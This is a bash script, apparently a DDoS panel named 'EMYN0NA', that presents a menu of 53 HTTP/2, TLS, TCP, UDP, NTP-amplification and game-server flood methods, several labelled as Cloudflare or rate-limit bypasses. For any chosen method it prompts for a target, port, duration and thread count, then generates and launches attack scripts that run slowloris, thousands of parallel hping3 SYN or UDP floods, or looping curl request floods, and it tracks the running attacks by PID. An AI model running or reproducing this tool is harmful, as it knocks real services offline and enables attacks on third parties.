#!/bin/bash

set -euo pipefail

# Couleurs
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color
BOLD='\033[1m'

# Fonction pour afficher le header
show_header() {
    clear
    echo -e "${CYAN}"
    cat << "EOF"
    ╔══════════════════════════════════════════════════════════════╗
    ║                                                              ║
    ║     ███████╗███╗   ███╗██╗   ██╗███╗   ██╗ ██████╗        ║
    ║     ██╔════╝████╗ ████║╚██╗ ██╔╝████╗ ██║██╔═══██╗       ║
    ║     █████╗  ██╔████╔██║ ╚████╔╝ ██╔██╗██║██║   ██║       ║
    ║     ██╔══╝  ██║╚██╔╝██║  ╚██╔╝  ██║╚████║██║   ██║       ║
    ║     ███████╗██║ ╚═╝ ██║   ██║   ██║ ╚███║╚██████╔╝       ║
    ║     ╚══════╝╚═╝     ╚═╝   ╚═╝   ╚═╝  ╚══╝ ╚═════╝        ║
    ║                                                              ║
    ║              ${BOLD}Advanced DDoS Attack Framework${NC}${CYAN}              ║
    ║                                                              ║
    ╚══════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

# Fonction pour afficher le menu principal
show_menu() {
    echo -e "${WHITE}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${WHITE}║${NC} ${GREEN}Select Attack Method:${NC}                                           ${WHITE}║${NC}"
    echo -e "${WHITE}╠══════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${WHITE}║${NC} ${CYAN}LAYER 7 (HTTP/HTTPS) ATTACKS:${NC}                              ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}                                                          ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[1]${NC}  browser          - HTTP/2/3 Flood (Chrome/Firefox)      ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[2]${NC}  browser-vip      - Browser VIP Attack                    ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[3]${NC}  h2-raw           - HTTP/2 Raw Flood (High RPS)           ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[4]${NC}  h2-rawgeo        - HTTP/2 Raw Geo Flood                  ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[5]${NC}  h2-zero          - HTTP/2 Flood (UAM Bypass)             ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[6]${NC}  h2-zerov2        - HTTP/2 Zero V2                        ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[7]${NC}  h2f              - HTTP/2 Flood                          ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[8]${NC}  h2f-priv         - HTTP/2 Flood Private                 ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[9]${NC}  http-free        - Free HTTP Flood                       ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[10]${NC} http-raw         - RAW GET Flood                         ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[11]${NC} http-raw-priv    - RAW GET Flood Private                ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[12]${NC} http3-raw       - HTTP/3 Raw Flood                      ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[13]${NC} ntol             - NTOL Attack                           ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[14]${NC} ntol2            - NTOL2 Attack                          ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[15]${NC} psuh             - PSUH Attack                           ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[16]${NC} r-flood          - HTTP/2 Flood (Cloudflare Bypass)      ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[17]${NC} rapid-zero       - HTTP/2/3 Flood (Chrome/Firefox)       ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[18]${NC} rapid-zero-priv  - Rapid Zero Private                   ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[19]${NC} static           - HTTP/2 Get (Static Sites)            ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[20]${NC} tlsv2            - TLS 1.2 Flood Bypass                  ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[21]${NC} vhold            - Method for Holding Sites             ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[22]${NC} vholdv2          - VHold V2                              ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[23]${NC} zero             - HTTP/2 Flooder (Ratelimit)            ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[24]${NC} zero-bypass      - Bypassing All Sites                   ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[25]${NC} zero-rst         - Zero RST (Cloudflare Custom Rule)     ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[26]${NC} zero-rstgeo      - Zero RST Geo                          ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[27]${NC} zeronet          - HTTP/2 Bypass (Bulk Cipher)            ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[28]${NC} zerov2           - HTTP/2 Flooder (Ratelimit Bypass)     ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[29]${NC} zflood           - ZFlood Attack                         ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[30]${NC} zflood-priv      - ZFlood Private                        ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}                                                          ${WHITE}║${NC}"
    echo -e "${WHITE}╠══════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${WHITE}║${NC} ${CYAN}LAYER 4 (TCP/UDP) ATTACKS:${NC}                                ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}                                                          ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[31]${NC} discord          - Discord UDP Static Server              ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[32]${NC} dns              - High GBPS DNS Flood                    ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[33]${NC} fivem            - FiveM API Attack                      ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[34]${NC} householder      - Home Holder (36000s timelimit)         ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[35]${NC} mcbot            - Minecraft Bot Attack (2000+ bots)     ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[36]${NC} ntp              - NTP Amplification                      ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[37]${NC} ovhtcp           - OVH TCP Attack                         ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[38]${NC} ovhudp           - OVH UDP Attack                         ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[39]${NC} samp             - SAMP Random Protocols                 ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[40]${NC} sshkill          - SSH Kill Attack                        ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[41]${NC} sshkill-bot      - SSH Kill Bot                          ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[42]${NC} std-bot          - Standard Bot Attack                    ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[43]${NC} tcp              - High PPS TCP Flood                     ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[44]${NC} tcp-bot          - TCP Bot Attack                         ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[45]${NC} tcp-pshack       - TCP PSH + ACK                          ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[46]${NC} tcprand          - TCP Random                             ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[47]${NC} udpflood         - UDP Spoofed Flood                      ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[48]${NC} udphex           - UDP Hex Flood                          ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[49]${NC} udphex-bot       - UDP Hex Bot                            ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[50]${NC} udpplain         - UDP Plain Flood                        ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[51]${NC} udpplain-bot     - UDP Plain Bot                          ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[52]${NC} udpplainv2       - UDP Plain V2                           ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[53]${NC} vse-bot          - VSE Bot Attack                         ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}                                                          ${WHITE}║${NC}"
    echo -e "${WHITE}╠══════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${WHITE}║${NC} ${CYAN}UTILITIES:${NC}                                                ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}                                                          ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[99]${NC} View Active Attacks                                        ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[98]${NC} Stop All Attacks                                          ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[97]${NC} Test Connection                                           ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[0]${NC}  Exit                                                       ${WHITE}║${NC}"
    echo -e "${WHITE}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

# Fonction pour demander les paramètres d'attaque
get_attack_params() {
    local method=$1
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║${NC} ${BOLD}Attack Parameters: ${method}${NC}                                    ${CYAN}║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    read -p "$(echo -e ${YELLOW}Target IP/Host:${NC} ) " TARGET
    read -p "$(echo -e ${YELLOW}Port [default: 443 for L7, custom for L4]:${NC} ) " PORT
    PORT=${PORT:-443}
    
    read -p "$(echo -e ${YELLOW}Duration in seconds [default: 60]:${NC} ) " DURATION
    DURATION=${DURATION:-60}
    
    read -p "$(echo -e ${YELLOW}Threads/Connections [default: 1000]:${NC} ) " THREADS
    THREADS=${THREADS:-1000}
    
    # Vérifier restriction L4 sur ports 80/443
    if [[ "$method" =~ ^(discord|dns|fivem|homeholder|mcbot|ntp|ovhtcp|ovhudp|samp|sshkill|sshkill-bot|std-bot|tcp|tcp-bot|tcp-pshack|tcprand|udpflood|udphex|udphex-bot|udpplain|udpplain-bot|udpplainv2|vse-bot)$ ]]; then
        if [ "$PORT" = "80" ] || [ "$PORT" = "443" ]; then
            echo -e "${RED}ERROR: L4 attacks on ports 80 and 443 are forbidden!${NC}"
            read -p "Press Enter to continue..."
            return 1
        fi
    fi
    
    read -p "$(echo -e ${YELLOW}Additional options [optional]:${NC} ) " OPTIONS
    
    export TARGET PORT DURATION THREADS OPTIONS
    return 0
}

# Fonction pour lancer une attaque L7
launch_l7_attack() {
    local method=$1
    local script_path="/opt/discord.cool/attacks/l7_${method}.sh"
    
    if [ ! -f "$script_path" ]; then
        echo -e "${RED}Attack script not found: $script_path${NC}"
        echo -e "${YELLOW}Creating template...${NC}"
        create_l7_script "$method"
    fi
    
    echo -e "${GREEN}Launching ${method} attack...${NC}"
    bash "$script_path" "$TARGET" "$PORT" "$DURATION" "$THREADS" "$OPTIONS" &
    echo $! > "/tmp/emyn0na_${method}.pid"
    echo -e "${GREEN}Attack started! PID: $(cat /tmp/emyn0na_${method}.pid)${NC}"
}

# Fonction pour lancer une attaque L4
launch_l4_attack() {
    local method=$1
    local script_path="/opt/discord.cool/attacks/l4_${method}.sh"
    
    if [ ! -f "$script_path" ]; then
        echo -e "${RED}Attack script not found: $script_path${NC}"
        echo -e "${YELLOW}Creating template...${NC}"
        create_l4_script "$method"
    fi
    
    echo -e "${GREEN}Launching ${method} attack...${NC}"
    bash "$script_path" "$TARGET" "$PORT" "$DURATION" "$THREADS" "$OPTIONS" &
    echo $! > "/tmp/emyn0na_${method}.pid"
    echo -e "${GREEN}Attack started! PID: $(cat /tmp/emyn0na_${method}.pid)${NC}"
}

# Fonction pour créer un script L7
create_l7_script() {
    local method=$1
    mkdir -p /opt/discord.cool/attacks
    
    cat > "/opt/discord.cool/attacks/l7_${method}.sh" << 'SCRIPT_EOF'
#!/bin/bash
TARGET=$1
PORT=${2:-443}
DURATION=${3:-60}
THREADS=${4:-1000}
OPTIONS=$5

METHOD="METHOD_NAME"
TIMEOUT=$((DURATION + 10))

echo "[$METHOD] Starting attack on $TARGET:$PORT for ${DURATION}s with $THREADS threads"

# Utiliser les outils disponibles ou créer une attaque basique
if command -v slowloris &> /dev/null; then
    slowloris "$TARGET" -p "$PORT" -s "$THREADS" -t "$DURATION" $OPTIONS
elif command -v hping3 &> /dev/null; then
    for i in $(seq 1 $THREADS); do
        timeout "$DURATION" hping3 -S -p "$PORT" -i u1000 "$TARGET" &
    done
    wait
else
    # Attaque HTTP basique avec curl
    for i in $(seq 1 $THREADS); do
        timeout "$DURATION" bash -c "while true; do curl -s -k -m 1 https://$TARGET:$PORT > /dev/null 2>&1; done" &
    done
    wait
fi

echo "[$METHOD] Attack completed"
SCRIPT_EOF
    
    sed -i "s/METHOD_NAME/$method/g" "/opt/discord.cool/attacks/l7_${method}.sh"
    chmod +x "/opt/discord.cool/attacks/l7_${method}.sh"
}

# Fonction pour créer un script L4
create_l4_script() {
    local method=$1
    mkdir -p /opt/discord.cool/attacks
    
    cat > "/opt/discord.cool/attacks/l4_${method}.sh" << 'SCRIPT_EOF'
#!/bin/bash
TARGET=$1
PORT=${2:-80}
DURATION=${3:-60}
THREADS=${4:-1000}
OPTIONS=$5

METHOD="METHOD_NAME"
TIMEOUT=$((DURATION + 10))

# Vérification restriction ports 80/443
if [ "$PORT" = "80" ] || [ "$PORT" = "443" ]; then
    echo "ERROR: L4 attacks on ports 80 and 443 are forbidden!"
    exit 1
fi

echo "[$METHOD] Starting attack on $TARGET:$PORT for ${DURATION}s with $THREADS threads"

if command -v hping3 &> /dev/null; then
    case "$METHOD" in
        tcp|tcp-bot|tcp-pshack)
            for i in $(seq 1 $THREADS); do
                timeout "$DURATION" hping3 -S -p "$PORT" -i u1000 "$TARGET" &
            done
            ;;
        udp*)
            for i in $(seq 1 $THREADS); do
                timeout "$DURATION" hping3 --udp -p "$PORT" -i u1000 "$TARGET" &
            done
            ;;
        *)
            for i in $(seq 1 $THREADS); do
                timeout "$DURATION" hping3 -S -p "$PORT" -i u1000 "$TARGET" &
            done
            ;;
    esac
    wait
else
    echo "hping3 not found, install it first"
    exit 1
fi

echo "[$METHOD] Attack completed"
SCRIPT_EOF
    
    sed -i "s/METHOD_NAME/$method/g" "/opt/discord.cool/attacks/l4_${method}.sh"
    chmod +x "/opt/discord.cool/attacks/l4_${method}.sh"
}

# Fonction pour voir les attaques actives
view_active_attacks() {
    clear
    show_header
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║${NC} ${BOLD}Active Attacks${NC}                                                 ${CYAN}║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    local found=false
    for pidfile in /tmp/emyn0na_*.pid; do
        if [ -f "$pidfile" ]; then
            local pid=$(cat "$pidfile")
            local method=$(basename "$pidfile" | sed 's/emyn0na_//;s/.pid//')
            if ps -p "$pid" > /dev/null 2>&1; then
                found=true
                echo -e "${GREEN}[ACTIVE]${NC} Method: ${YELLOW}$method${NC} | PID: $pid"
            else
                rm -f "$pidfile"
            fi
        fi
    done
    
    if [ "$found" = false ]; then
        echo -e "${YELLOW}No active attacks${NC}"
    fi
    
    echo ""
    read -p "Press Enter to continue..."
}

# Fonction pour arrêter toutes les attaques
stop_all_attacks() {
    echo -e "${RED}Stopping all attacks...${NC}"
    for pidfile in /tmp/emyn0na_*.pid; do
        if [ -f "$pidfile" ]; then
            local pid=$(cat "$pidfile")
            if ps -p "$pid" > /dev/null 2>&1; then
                kill "$pid" 2>/dev/null && echo -e "${GREEN}Stopped PID: $pid${NC}"
            fi
            rm -f "$pidfile"
        fi
    done
    pkill -f "l7_.*\.sh" 2>/dev/null
    pkill -f "l4_.*\.sh" 2>/dev/null
    echo -e "${GREEN}All attacks stopped${NC}"
    sleep 2
}

# Fonction pour tester la connexion
test_connection() {
    read -p "$(echo -e ${YELLOW}Target to test:${NC} ) " test_target
    echo -e "${CYAN}Testing connection to $test_target...${NC}"
    
    if timeout 5 curl -s -k -m 3 "https://$test_target" > /dev/null 2>&1; then
        echo -e "${GREEN}✓ HTTPS connection successful${NC}"
    elif timeout 5 curl -s -m 3 "http://$test_target" > /dev/null 2>&1; then
        echo -e "${GREEN}✓ HTTP connection successful${NC}"
    else
        echo -e "${RED}✗ Connection failed${NC}"
    fi
    
    read -p "Press Enter to continue..."
}

# Main loop
main() {
    while true; do
        show_header
        show_menu
        echo ""
        read -p "$(echo -e ${BOLD}${GREEN}Select option:${NC} ) " choice
        
        case $choice in
            1) get_attack_params "browser" && launch_l7_attack "browser" ;;
            2) get_attack_params "browser-vip" && launch_l7_attack "browser-vip" ;;
            3) get_attack_params "h2-raw" && launch_l7_attack "h2-raw" ;;
            4) get_attack_params "h2-rawgeo" && launch_l7_attack "h2-rawgeo" ;;
            5) get_attack_params "h2-zero" && launch_l7_attack "h2-zero" ;;
            6) get_attack_params "h2-zerov2" && launch_l7_attack "h2-zerov2" ;;
            7) get_attack_params "h2f" && launch_l7_attack "h2f" ;;
            8) get_attack_params "h2f-priv" && launch_l7_attack "h2f-priv" ;;
            9) get_attack_params "http-free" && launch_l7_attack "http-free" ;;
            10) get_attack_params "http-raw" && launch_l7_attack "http-raw" ;;
            11) get_attack_params "http-raw-priv" && launch_l7_attack "http-raw-priv" ;;
            12) get_attack_params "http3-raw" && launch_l7_attack "http3-raw" ;;
            13) get_attack_params "ntol" && launch_l7_attack "ntol" ;;
            14) get_attack_params "ntol2" && launch_l7_attack "ntol2" ;;
            15) get_attack_params "psuh" && launch_l7_attack "psuh" ;;
            16) get_attack_params "r-flood" && launch_l7_attack "r-flood" ;;
            17) get_attack_params "rapid-zero" && launch_l7_attack "rapid-zero" ;;
            18) get_attack_params "rapid-zero-priv" && launch_l7_attack "rapid-zero-priv" ;;
            19) get_attack_params "static" && launch_l7_attack "static" ;;
            20) get_attack_params "tlsv2" && launch_l7_attack "tlsv2" ;;
            21) get_attack_params "vhold" && launch_l7_attack "vhold" ;;
            22) get_attack_params "vholdv2" && launch_l7_attack "vholdv2" ;;
            23) get_attack_params "zero" && launch_l7_attack "zero" ;;
            24) get_attack_params "zero-bypass" && launch_l7_attack "zero-bypass" ;;
            25) get_attack_params "zero-rst" && launch_l7_attack "zero-rst" ;;
            26) get_attack_params "zero-rstgeo" && launch_l7_attack "zero-rstgeo" ;;
            27) get_attack_params "zeronet" && launch_l7_attack "zeronet" ;;
            28) get_attack_params "zerov2" && launch_l7_attack "zerov2" ;;
            29) get_attack_params "zflood" && launch_l7_attack "zflood" ;;
            30) get_attack_params "zflood-priv" && launch_l7_attack "zflood-priv" ;;
            31) get_attack_params "discord" && launch_l4_attack "discord" ;;
            32) get_attack_params "dns" && launch_l4_attack "dns" ;;
            33) get_attack_params "fivem" && launch_l4_attack "fivem" ;;
            34) get_attack_params "homeholder" && launch_l4_attack "homeholder" ;;
            35) get_attack_params "mcbot" && launch_l4_attack "mcbot" ;;
            36) get_attack_params "ntp" && launch_l4_attack "ntp" ;;
            37) get_attack_params "ovhtcp" && launch_l4_attack "ovhtcp" ;;
            38) get_attack_params "ovhudp" && launch_l4_attack "ovhudp" ;;
            39) get_attack_params "samp" && launch_l4_attack "samp" ;;
            40) get_attack_params "sshkill" && launch_l4_attack "sshkill" ;;
            41) get_attack_params "sshkill-bot" && launch_l4_attack "sshkill-bot" ;;
            42) get_attack_params "std-bot" && launch_l4_attack "std-bot" ;;
            43) get_attack_params "tcp" && launch_l4_attack "tcp" ;;
            44) get_attack_params "tcp-bot" && launch_l4_attack "tcp-bot" ;;
            45) get_attack_params "tcp-pshack" && launch_l4_attack "tcp-pshack" ;;
            46) get_attack_params "tcprand" && launch_l4_attack "tcprand" ;;
            47) get_attack_params "udpflood" && launch_l4_attack "udpflood" ;;
            48) get_attack_params "udphex" && launch_l4_attack "udphex" ;;
            49) get_attack_params "udphex-bot" && launch_l4_attack "udphex-bot" ;;
            50) get_attack_params "udpplain" && launch_l4_attack "udpplain" ;;
            51) get_attack_params "udpplain-bot" && launch_l4_attack "udpplain-bot" ;;
            52) get_attack_params "udpplainv2" && launch_l4_attack "udpplainv2" ;;
            53) get_attack_params "vse-bot" && launch_l4_attack "vse-bot" ;;
            99) view_active_attacks ;;
            98) stop_all_attacks ;;
            97) test_connection ;;
            0) 
                stop_all_attacks
                echo -e "${GREEN}Goodbye!${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}Invalid option!${NC}"
                sleep 1
                ;;
        esac
        
        if [ $? -eq 0 ] && [ "$choice" -ge 1 ] && [ "$choice" -le 53 ]; then
            echo ""
            read -p "$(echo -e ${YELLOW}Press Enter to continue...${NC})"
        fi
    done
}

# Run main
main

